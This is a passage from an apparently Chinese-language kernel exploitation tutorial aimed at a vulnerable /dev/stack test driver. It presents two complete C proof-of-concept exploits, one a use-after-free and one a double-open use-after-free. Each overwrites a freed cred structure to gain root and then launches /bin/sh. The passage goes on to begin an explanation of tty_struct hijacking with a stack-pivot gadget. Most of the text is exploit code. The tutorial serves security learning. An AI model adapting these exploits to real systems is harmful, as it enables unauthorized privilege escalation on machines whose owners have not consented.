
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>

struct addNote
{
    size_t len;
    char *data;
};

struct editNote
{
    size_t idx;
    size_t len;
    char *data;
};

//open dev
int openDev(char *pos);
void addFun(int fd,struct addNote *arg);
void freeFun(int fd,struct editNote *arg);
void editFun(int fd,struct editNote *arg);
void readFun(int fd,struct editNote *arg);

int main(int argc, char *argv[])
{
    int fd;
    int idFork;
    unsigned long memOffset;
    struct addNote addChunk;
    struct editNote readChunk;
    struct editNote editChunk;

    //open Dev
    char *pos = "/dev/stack";
    fd = openDev(pos);

    char credBuf[0xa8] = {0};
    addChunk.len = 0xa8;
    addChunk.data = credBuf;
    addFun(fd,&addChunk);

    editChunk.idx = 0;
    freeFun(fd,&editChunk);

    idFork = fork();
    editChunk.data = credBuf;
    editChunk.len = 28;
    if(idFork == 0){
        //get into 28*0 to set uid and gid 0
        editFun(fd,&editChunk);
        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(idFork < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }

    return 0;

}

int openDev(char *pos){
    int fd;
    printf("[+] Open %s...\n",pos);
    if ((fd = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return fd;
}

void addFun(int fd, struct addNote *arg)
{
    ioctl(fd,1,arg);
}

void freeFun(int fd, struct editNote *arg)
{
    ioctl(fd,888,arg);
}

void editFun(int fd, struct editNote *arg)
{
    ioctl(fd,3,arg);
}

void readFun(int fd, struct editNote *arg)
{
    ioctl(fd,4,arg);
}
```

这里还需要说明的是，`cred`结构体大小在我编译的4.4.72中为`0xa8`，在不同内核版本可能不同，通常可以查看对应版本的Linux内核源码或者写个简便的C程序运行一下即可知道。

## 2.伪条件竞争造成的UAF(多进程)

### 前置知识

前面我们的UAF是正常的指针未置空的UAF，但如果在程序中是`add`函数申请chunk，只有在关闭设备时才会释放chunk。那么这样当我们对一个设备进行操作时，只有在关闭设备时才能释放chunk，这就无法显著地造成UAF。但是如果能够对同一个设备打开两次 (操作符分别为`fd1`,`fd2`) ，申请一个堆块后，关闭掉第一个设备`fd1`后，就能释放该堆块。之后利用`fd2`继续对设备进行写操作，就能够继续修改释放掉的堆块了，这样就造成了一个UAF漏洞。同样也是利用`cred`结构体进行提权。

同样直接给出poc即可

### POC

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>

struct addNote
{
    size_t len;
    char *data;
};

struct editNote
{
    size_t idx;
    size_t len;
    char *data;
};

//open dev
int openDev(char *pos);
void addFun(int fd,struct addNote *arg);
void freeFun(int fd,struct editNote *arg);
void editFun(int fd,struct editNote *arg);
void readFun(int fd,struct editNote *arg);

int main(int argc, char *argv[])
{
    int fd1,fd2;
    int idFork,idBefore;
    unsigned long memOffset;
    struct addNote addChunk;
    struct editNote readChunk;
    struct editNote editChunk;
    //char *mycred;

    //mycred = current_user_ns();
    //printf("Cred_addr:0x%llx\n",mycred);

    //open Dev
    char *pos = "/dev/stack";
    char credBuf[0xa8] = {0};
    fd1 = openDev(pos);
    fd2 = openDev(pos);
    ioctl(fd1,111,editChunk); //test add
    close(fd1);

    idFork = fork();
    printf("idFork:%d\n",idFork);

    if(idFork == 0){
        //get into 28*0 to set uid and gid 0
        idBefore = getuid();
        printf("Before uid:%d\n",idBefore);
        write(fd2, credBuf, 28);

        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(idFork < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }

    return 0;

}

int openDev(char *pos){
    int fd;
    printf("[+] Open %s...\n",pos);
    if ((fd = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return fd;
}

void addFun(int fd, struct addNote *arg)
{
    ioctl(fd,1,arg);
}

void freeFun(int fd, struct editNote *arg)
{
    ioctl(fd,888,arg);
}

void editFun(int fd, struct editNote *arg)
{
    ioctl(fd,3,arg);
}

void readFun(int fd, struct editNote *arg)
{
    ioctl(fd,4,arg);
}
```

# 二、劫持`tty_struct`结构体

这个真是调了我无敌久。

## 原理

### 1.函数调用链

`entry_SYSCALL_64`->`SyS_write`->`SYSC_write`->`vfs_write`->`__vfs_write`->`tty_write`->`do_tty_write`->`n_tty_write`->`pty_write`

### 2.劫持栈

由于用户空间和内核空间得返回进入需要用到栈，所以一般需要进行栈劫持，这里我们可以看到当通过`ptmx`进入其`write`函数时，`rax`为从`tty_struct`中获取的`operations *ops`指针，而此时该指针已经被我们劫持了，所以如果有类似于`mov rsp,rax`之类的gadget就能将栈劫持到我们可控的`operations *ops`指针指向的内存处，那么之后就很容易进行内核和用户空间的转换。

这里就用到常用的一个gadget

`movRspRax_decEbx_ret`

![image-20211011000008800](https://bbs.kanxue.com/upload/attach/202111/904686_UXT23XF4VJDRUBT.jpg)

### 3.结构体

这个之前也是讲过的
